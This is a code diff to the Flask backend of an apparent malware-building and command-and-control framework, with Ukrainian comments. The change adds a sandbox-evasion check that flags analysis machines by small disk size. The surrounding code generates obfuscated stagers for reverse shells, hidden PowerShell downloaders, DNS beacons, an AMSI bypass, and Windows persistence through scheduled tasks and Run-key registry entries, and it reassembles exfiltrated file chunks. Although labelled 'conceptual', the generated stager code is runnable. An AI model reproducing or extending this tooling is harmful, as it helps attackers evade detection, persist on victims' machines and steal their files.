@@ -1,13 +1,9 @@
-# Syntax Flask Backend - Segment SFB-CORE-1.9.1
-# Призначення: Backend на Flask з новим архетипом для концептуальної персистентності.
-# Оновлення v1.9.1:
-#   - Додано новий архетип пейлоада: 'windows_simple_persistence_stager'.
-#   - Додано нові параметри до CONCEPTUAL_PARAMS_SCHEMA_BE для 'windows_simple_persistence_stager':
-#     - persistence_method ('scheduled_task', 'registry_run_key')
-#     - command_to_persist
-#     - artifact_name
-#   - Реалізовано логіку генерації стейджера для нового архетипу.
-#   - Оновлено VERSION_BACKEND до "1.9.1".
+# Syntax Flask Backend - Segment SFB-CORE-1.9.2
+# Призначення: Backend на Flask з концептуальною перевіркою розміру диска.
+# Оновлення v1.9.2:
+#   - Додано концептуальну симуляцію перевірки розміру диска до функції ec_runtime.
+#   - Додано новий параметр 'enable_disk_size_check' до схеми та логіки генерації.
+#   - Оновлено VERSION_BACKEND до "1.9.2".
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -28,7 +24,7 @@ import os
 import uuid
 import shutil
 
-VERSION_BACKEND = "1.9.1" # Оновлено версію
+VERSION_BACKEND = "1.9.2" # Оновлено версію
 
 simulated_implants_be = []
 pending_tasks_for_implants = {}
@@ -79,7 +75,7 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = {
             "reverse_shell_tcp_shellcode_linux_x64",
             "powershell_downloader_stager",
             "dns_beacon_c2_concept",
-            "windows_simple_persistence_stager" # Новий архетип
+            "windows_simple_persistence_stager"
         ]
     },
     "message_to_echo": {"type": str, "required": lambda params: params.get("payload_archetype") == "demo_echo_payload", "min_length": 1},
@@ -136,7 +132,6 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = {
         "required": False,
         "default": "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass"
     },
-    # Параметри для нового архетипу windows_simple_persistence_stager
     "persistence_method": {
         "type": str,
         "required": lambda params: params.get("payload_archetype") == "windows_simple_persistence_stager",
@@ -147,14 +142,14 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = {
         "type": str,
         "required": lambda params: params.get("payload_archetype") == "windows_simple_persistence_stager",
         "min_length": 1,
-        "default": "calc.exe" # Приклад команди
+        "default": "calc.exe"
     },
-    "artifact_name": { # Ім'я завдання або ключа реєстру
+    "artifact_name": {
         "type": str,
         "required": lambda params: params.get("payload_archetype") == "windows_simple_persistence_stager",
         "min_length": 3,
         "default": "SyntaxUpdater",
-        "validation_regex": r"^[a-zA-Z0-9_.-]+$" # Дозволені символи для імені
+        "validation_regex": r"^[a-zA-Z0-9_.-]+$"
     },
     "obfuscation_key": {"type": str, "required": True, "min_length": 5, "default": "DefaultFrameworkKey"},
     "output_format": {
@@ -169,7 +164,8 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = {
     },
     "enable_stager_metamorphism": {"type": bool, "required": False, "default": True},
     "enable_evasion_checks": {"type": bool, "required": False, "default": True},
-    "enable_amsi_bypass_concept": {"type": bool, "required": False, "default": True}
+    "enable_amsi_bypass_concept": {"type": bool, "required": False, "default": True},
+    "enable_disk_size_check": {"type": bool, "required": False, "default": True} # Новий параметр
 }
 CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = {
     "demo_echo_payload": {"description": "Демо-пейлоад, що друкує повідомлення...", "template_type": "python_stager_echo"},
@@ -191,7 +187,7 @@ CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = {
         "description": "Концептуальний C2-маячок через DNS (симуляція передачі завдань)",
         "template_type": "python_stager_dns_c2_beacon"
     },
-    "windows_simple_persistence_stager": { # Новий архетип
+    "windows_simple_persistence_stager": {
         "description": "Windows Stager для простої персистентності (Scheduled Task або Registry Run Key)",
         "template_type": "python_stager_windows_persistence"
     }
@@ -718,8 +714,7 @@ def handle_generate_payload():
         archetype_details = CONCEPTUAL_ARCHETYPE_TEMPLATES_BE.get(archetype_name)
         log_messages.append(f"[BACKEND_ARCHETYPE_INFO] Архетип: {archetype_name} - {archetype_details['description']}")
 
-        # Збираємо дані для обфускації/патчингу залежно від архетипу
-        data_to_obfuscate_or_patch = {} # Використовуємо словник для гнучкості
+        data_to_obfuscate_or_patch = {}
         if archetype_name == "demo_echo_payload":
             data_to_obfuscate_or_patch['message'] = validated_params.get("message_to_echo", "Default Echo Message")
         elif archetype_name == "demo_file_lister_payload":
@@ -736,14 +731,13 @@ def handle_generate_payload():
             data_to_obfuscate_or_patch['ps_url'] = validated_params.get("powershell_script_url")
         elif archetype_name == "dns_beacon_c2_concept":
             data_to_obfuscate_or_patch['dns_zone'] = validated_params.get("c2_dns_zone")
-        elif archetype_name == "windows_simple_persistence_stager": # Новий архетип
+        elif archetype_name == "windows_simple_persistence_stager":
             data_to_obfuscate_or_patch['persistence_method'] = validated_params.get("persistence_method")
             data_to_obfuscate_or_patch['command_to_persist'] = validated_params.get("command_to_persist")
             data_to_obfuscate_or_patch['artifact_name'] = validated_params.get("artifact_name")
 
 
         key = validated_params.get("obfuscation_key", "DefaultFrameworkKey")
-        # Обфускуємо весь словник data_to_obfuscate_or_patch як JSON рядок
         obfuscated_payload_params_json = json.dumps(data_to_obfuscate_or_patch)
         log_messages.append(f"[BACKEND_OBF_INFO] Обфускація параметрів пейлоада: '{obfuscated_payload_params_json[:100]}...' з ключем '{key}'.")
         obfuscated_data_raw = xor_cipher(obfuscated_payload_params_json, key)
@@ -757,10 +751,11 @@ def handle_generate_payload():
             f"# Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
             f"# Archetype: {archetype_name}",
             f"OBFUSCATION_KEY_EMBEDDED = \"{key}\"",
-            f"OBF_DATA_B64 = \"{obfuscated_data_b64}\"", # Вбудовуємо обфускований JSON з параметрами
+            f"OBF_DATA_B64 = \"{obfuscated_data_b64}\"",
             f"METAMORPHISM_APPLIED = {validated_params.get('enable_stager_metamorphism', False)}",
             f"EVASION_CHECKS_APPLIED = {validated_params.get('enable_evasion_checks', False)}",
             f"AMSI_BYPASS_CONCEPT_APPLIED = {validated_params.get('enable_amsi_bypass_concept', False)}",
+            f"DISK_SIZE_CHECK_APPLIED = {validated_params.get('enable_disk_size_check', False)}", # Новий параметр для стейджера
         ]
 
         if archetype_name == "powershell_downloader_stager":
@@ -773,19 +768,17 @@ def handle_generate_payload():
         elif archetype_name == "dns_beacon_c2_concept":
             stager_implant_id = f"DNSIMPLNT-{random.randint(100,999)}"
             stager_code_lines.append(f"STAGER_IMPLANT_ID = \"{stager_implant_id}\"")
-            # Ці параметри вже будуть в OBF_DATA_B64, але для наочності можна було б їх дублювати,
-            # однак краще тримати їх централізовано в обфускованому JSON.
-            # stager_code_lines.append(f"C2_DNS_ZONE = \"{validated_params.get('c2_dns_zone')}\"")
-            # stager_code_lines.append(f"DNS_BEACON_SUBDOMAIN_PREFIX = \"{validated_params.get('dns_beacon_subdomain_prefix')}\"")
             stager_code_lines.append(f"DNS_BEACON_INTERVAL_SEC = {random.randint(25, 55)}")
 
-        stager_code_lines.extend(["", "import base64", "import os", "import time", "import random", "import string", "import subprocess", "import socket", "import json as json_stager_module"]) # json_stager_module для розпаковки параметрів
+        stager_code_lines.extend(["", "import base64", "import os", "import time", "import random", "import string", "import subprocess", "import socket", "import json as json_stager_module"])
         if archetype_name == "demo_c2_beacon_payload" or archetype_name == "dns_beacon_c2_concept":
-            stager_code_lines.extend(["import urllib.request", "import urllib.error"]) # json вже імпортовано як json_stager_module
+            stager_code_lines.extend(["import urllib.request", "import urllib.error"])
 
         if archetype_name in ["reverse_shell_tcp_shellcode_windows_x64", "reverse_shell_tcp_shellcode_linux_x64", "windows_simple_persistence_stager"] or \
-           validated_params.get('enable_evasion_checks') or validated_params.get('enable_amsi_bypass_concept'):
+           validated_params.get('enable_evasion_checks') or validated_params.get('enable_amsi_bypass_concept') or validated_params.get('enable_disk_size_check'):
             stager_code_lines.append("import ctypes")
+            if archetype_name == "reverse_shell_tcp_shellcode_linux_x64" or (os.name != 'nt' and validated_params.get('enable_disk_size_check')): # shutil для shutil.disk_usage на Linux/macOS
+                 stager_code_lines.append("import shutil")
             if archetype_name == "reverse_shell_tcp_shellcode_linux_x64":
                 stager_code_lines.append("import mmap as mmap_module")
         stager_code_lines.append("")
@@ -892,15 +885,54 @@ def handle_generate_payload():
             "            print(f\"[STAGER_EVASION_AMSI_ERROR] Помилка під час симуляції обходу AMSI: {{e_amsi}}\")",
             "            indicators.append('amsi_bypass_exception_sim')",
             "",
+            # --- Нова концептуальна перевірка розміру диска ---
+            "    if DISK_SIZE_CHECK_APPLIED:",
+            "        print(\"[STAGER_EVASION_DISK] Концептуальна перевірка розміру диска...\")",
+            "        try:",
+            "            min_disk_size_gb_threshold = 50 # Порогове значення в ГБ (можна зробити параметром)",
+            "            total_bytes = 0",
+            "            if os.name == 'nt':",
+            "                free_bytes_available_to_caller = ctypes.c_ulonglong(0)",
+            "                total_number_of_bytes = ctypes.c_ulonglong(0)",
+            "                total_number_of_free_bytes = ctypes.c_ulonglong(0)",
+            "                kernel32 = ctypes.windll.kernel32",
+            "                success = kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p('C:\\'),", # Перевіряємо диск C:
+            "                                                      ctypes.byref(free_bytes_available_to_caller),",
+            "                                                      ctypes.byref(total_number_of_bytes),",
+            "                                                      ctypes.byref(total_number_of_free_bytes))",
+            "                if success:",
+            "                    total_bytes = total_number_of_bytes.value",
+            "                else:",
+            "                    print(f\"[STAGER_EVASION_DISK_WARN_WIN] Не вдалося отримати розмір диска C:: {{ctypes.WinError()}}\")",
+            "            else: # Linux/macOS (потребує імпорту shutil)",
+            "                try:",
+            "                    disk_usage_stats = shutil.disk_usage('/') # Перевіряємо кореневий розділ",
+            "                    total_bytes = disk_usage_stats.total",
+            "                except NameError: # Якщо shutil не імпортовано (малоймовірно через логіку імпортів)",
+            "                    print(\"[STAGER_EVASION_DISK_WARN_POSIX] Модуль shutil не імпортовано для перевірки диска.\")",
+            "                except Exception as e_disk_posix:",
+            "                    print(f\"[STAGER_EVASION_DISK_WARN_POSIX] Помилка отримання розміру диска /: {{e_disk_posix}}\")",
+            "",
+            "            if total_bytes > 0:",
+            "                total_gb = total_bytes / (1024**3)",
+            "                print(f\"[STAGER_EVASION_DISK_INFO] Загальний розмір диска: {{total_gb:.2f}} GB.\")",
+            "                if total_gb < min_disk_size_gb_threshold:",
+            "                    indicators.append(f'low_disk_size_{{total_gb:.0f}}gb')",
+            "            else:",
+            "                 print(\"[STAGER_EVASION_DISK_INFO] Не вдалося визначити загальний розмір диска.\")",
+            "        except Exception as e_disk_check:",
+            "            print(f\"[STAGER_EVASION_DISK_ERROR] Помилка під час перевірки розміру диска: {{e_disk_check}}\")",
+            "            indicators.append('disk_size_check_exception')",
+            "",
             "    if indicators:",
             "        print(f\"[STAGER_EVASION] Виявлено індикатори аналітичного середовища: {{', '.join(indicators)}}! Зміна поведінки або вихід.\")",
             "        return True",
             "    print(\"[STAGER_EVASION] Перевірки ухилення пройдені (концептуально).\")",
             "    return False",
             "",
-            f"def {execute_func_name_runtime}(payload_params_json, arch_type):", # Тепер приймає JSON з параметрами
+            f"def {execute_func_name_runtime}(payload_params_json, arch_type):",
             "    try:",
-            "        payload_params = json_stager_module.loads(payload_params_json)", # Розпаковуємо параметри
+            "        payload_params = json_stager_module.loads(payload_params_json)",
             "    except Exception as e_json_parse:",
             "        print(f\"[PAYLOAD_ERROR] Помилка розпаковки параметрів пейлоада: {{e_json_parse}}\")",
             "        return",
@@ -1040,7 +1072,7 @@ def handle_generate_payload():
 
             "    elif arch_type == 'dns_beacon_c2_concept':",
             "        c2_zone = payload_params.get('dns_zone')",
-            "        dns_prefix = DNS_BEACON_SUBDOMAIN_PREFIX", # Можна також передавати через payload_params
+            "        dns_prefix = DNS_BEACON_SUBDOMAIN_PREFIX",
             "        implant_id_dns = STAGER_IMPLANT_ID",
             "        beacon_interval = DNS_BEACON_INTERVAL_SEC",
             "        last_task_result_dns = None",
@@ -1195,7 +1227,6 @@ def handle_generate_payload():
             "                print(f\"[PAYLOAD_ERROR] Помилка виконання PowerShell скрипта (код: {{result.returncode}}). STDERR: {{result.stderr}}\")",
             "        except Exception as e_ps_download:",
             "            print(f\"[PAYLOAD_ERROR ({{arch_type}})] Помилка під час завантаження/виконання PowerShell: {{e_ps_download}}\")",
-            # Нова логіка для windows_simple_persistence_stager
             "    elif arch_type == 'windows_simple_persistence_stager':",
             "        method = payload_params.get('persistence_method')",
             "        command = payload_params.get('command_to_persist')",
@@ -1203,17 +1234,14 @@ def handle_generate_payload():
             "        print(f\"[PAYLOAD_PERSISTENCE] Встановлення персистентності. Метод: {{method}}, Команда: '{{command}}', Ім'я: '{{name}}'\")",
             "        persist_cmd_parts = []",
             "        success_msg = ''",
-            "        if os.name != 'nt':", # Перевірка, чи це Windows
+            "        if os.name != 'nt':",
             "            print(\"[PAYLOAD_PERSISTENCE_ERROR] Цей архетип призначений тільки для Windows.\")",
             "            return",
             "        try:",
             "            if method == 'scheduled_task':",
-            # Використовуємо schtasks.exe. Потрібні права адміністратора для /rl HIGHEST. /sc ONLOGON - при вході будь-якого користувача.
-            # /f - примусово створити, якщо вже існує.
-            "                persist_cmd_parts = ['schtasks', '/create', '/tn', name, '/tr', command, '/sc', 'ONLOGON', '/f'] # /rl', 'HIGHEST' - може вимагати адміна",
+            "                persist_cmd_parts = ['schtasks', '/create', '/tn', name, '/tr', command, '/sc', 'ONLOGON', '/f']",
             "                success_msg = f\"Заплановане завдання '{{name}}' для команди '{{command}}' (начебто) створено.\"",
             "            elif method == 'registry_run_key':",
-            # Використовуємо reg.exe для додавання ключа в HKCU (не вимагає адміна)
             "                registry_path = r\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"",
             "                persist_cmd_parts = ['reg', 'add', registry_path, '/v', name, '/t', 'REG_SZ', '/d', command, '/f']",
             "                success_msg = f\"Запис реєстру '{{name}}' в '{{registry_path}}' для команди '{{command}}' (начебто) створено.\"",
@@ -1222,7 +1250,7 @@ def handle_generate_payload():
             "                return",
             "",
             "            print(f\"[PAYLOAD_PERSISTENCE_EXEC] Виконання команди: {{' '.join(persist_cmd_parts)}}\")",
-            "            proc = subprocess.run(persist_cmd_parts, capture_output=True, text=True, shell=False, check=False, encoding='cp866', errors='ignore')", # cp866 для Windows консолі
+            "            proc = subprocess.run(persist_cmd_parts, capture_output=True, text=True, shell=False, check=False, encoding='cp866', errors='ignore')",
             "            if proc.returncode == 0:",
             "                print(f\"[PAYLOAD_PERSISTENCE_SUCCESS] {{success_msg}}\")",
             "                print(f\"  STDOUT: {{proc.stdout}}\")",
@@ -1236,7 +1264,7 @@ def handle_generate_payload():
             "if __name__ == '__main__':",
             "    print(f\"[STAGER] Стейджер для '{archetype_name}' запускається...\")",
             "    sandbox_detected_flag = False",
-            "    if EVASION_CHECKS_APPLIED or AMSI_BYPASS_CONCEPT_APPLIED:",
+            "    if EVASION_CHECKS_APPLIED or AMSI_BYPASS_CONCEPT_APPLIED or DISK_SIZE_CHECK_APPLIED:", # Додано DISK_SIZE_CHECK_APPLIED
             f"        sandbox_detected_flag = {evasion_func_name_runtime}()",
             "    if not sandbox_detected_flag:",
             f"        decoded_payload_parameters_json = {decode_func_name_runtime}(OBF_DATA_B64, OBFUSCATION_KEY_EMBEDDED)",
@@ -1360,8 +1388,8 @@ def handle_run_recon():
         if not target or not recon_type: return jsonify({"success": False, "error": "Missing params (target or recon_type)", "reconLog": "\n".join(log_messages+["[BE_ERR] Missing params."])}), 400
         recon_results_text = ""
         recon_log_additions = []
-        parsed_services = []
-        cve_results = []
+        # parsed_services = [] # Не використовується напряму тут, але може бути повернуто з perform_nmap_scan_be
+        # cve_results = [] # Аналогічно
         if recon_type == "port_scan_basic":
             recon_log_additions, recon_results_text = simulate_port_scan_be(target)
         elif recon_type == "port_scan_nmap_standard":
@@ -1385,14 +1413,14 @@ def handle_run_recon():
             else: recon_results_text += "OS information not found or could not be parsed.\n\n"
             recon_results_text += "--- Parsed Services & Conceptual CVE Lookup ---\n"
             if parsed_services_nmap:
-                cve_log_additions = []
-                cve_results = conceptual_cve_lookup_be(parsed_services_nmap, cve_log_additions)
-                recon_log_additions.extend(cve_log_additions)
+                cve_log_additions_local = [] # Локальні логи для CVE, щоб не змішувати з nmap логами
+                cve_results_local = conceptual_cve_lookup_be(parsed_services_nmap, cve_log_additions_local)
+                recon_log_additions.extend(cve_log_additions_local)
                 for service in parsed_services_nmap:
                     recon_results_text += f"Port: {service.get('port')}/{service.get('protocol')}\n  Service: {service.get('service_name')}\n  Product: {service.get('product','')}\n  Version: {service.get('version_number','')}\n"
                     if service.get('extrainfo'): recon_results_text += f"  ExtraInfo: {service.get('extrainfo')}\n"
                     if service.get('cpes'): recon_results_text += f"  Service CPEs: {', '.join(service.get('cpes'))}\n"
-                    service_cves_found = [cve for cve in cve_results if cve.get('port') == service.get('port')]
+                    service_cves_found = [cve for cve in cve_results_local if cve.get('port') == service.get('port')]
                     if service_cves_found:
                         for cve in service_cves_found: recon_results_text += f"    CVE ID: {cve['cve_id']} (Severity: {cve['severity']})\n      Summary: {cve['summary']}\n"
                     else: recon_results_text += "    No conceptual CVEs found for this service in the local DB.\n"
@@ -1442,7 +1470,7 @@ def handle_c2_beacon():
                  log_messages_c2_beacon.append(f"   [EXFIL_CHUNK] Отримано чанк #{chunk_num}/{total_chunks} для '{file_path}' (ID завдання: {last_task_id_received}).")
             if is_final_chunk or (total_chunks is not None and len(exfiltrated_file_chunks_db[file_key]["received_chunks"]) == total_chunks):
                 log_messages_c2_beacon.append(f"   [EXFIL_COMPLETE] Всі {total_chunks} чанків для '{file_path}' (ID завдання: {last_task_id_received}) отримано від {implant_id_from_beacon}.")
-                del exfiltrated_file_chunks_db[file_key]
+                if file_key in exfiltrated_file_chunks_db: del exfiltrated_file_chunks_db[file_key] # Виправлено
         elif beacon_data.get("file_exfil_error"): log_messages_c2_beacon.append(f"   [EXFIL_ERROR_REPORTED] Імплант повідомив про помилку ексфільтрації: {beacon_data['file_exfil_error']}")
         implant_found_in_list = False
         for implant in simulated_implants_be:
